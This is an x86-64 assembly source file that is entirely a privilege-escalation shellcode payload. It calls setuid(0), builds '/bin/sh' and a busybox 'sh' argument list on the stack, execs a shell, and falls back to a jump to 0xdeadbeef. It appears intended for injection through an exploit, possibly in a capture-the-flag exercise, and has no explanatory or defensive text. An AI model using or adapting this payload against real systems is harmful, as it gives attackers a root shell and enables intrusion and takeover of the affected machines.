.intel_syntax noprefix
.section .text
.global _start

_start:
    xor rdi, rdi
    mov rax, 0x69
    syscall

    sub rsp, 0x40
    mov rdx, 0x68732f6e69622f // /bin/sh
    push rdx
    mov rdi,rsp

    mov rax,0x786f6279737562   
    mov QWORD PTR [rsp+0x8], rax     // busybox
    mov rax, 0x6873
    mov QWORD PTR [rsp+0x10], rax    // sh
    xor eax, eax
    mov QWORD PTR [rsp+0x18], rax    // null
    lea rsi, [rsp+0x8]
    mov QWORD PTR [rsp+0x20], rsi    // argv[0]
    lea rsi, [rsp+0x10]
    mov QWORD PTR [rsp+0x28], rsi    // argv[1]
    xor esi, esi
    mov QWORD PTR [rsp+0x30], rsi    //  0
    lea rsi, [rsp+0x20]
    xor edx, edx
    mov rax,0x3b
    syscall
    
    mov rdi, 0xdeadbeef
    push rdi
    ret
    
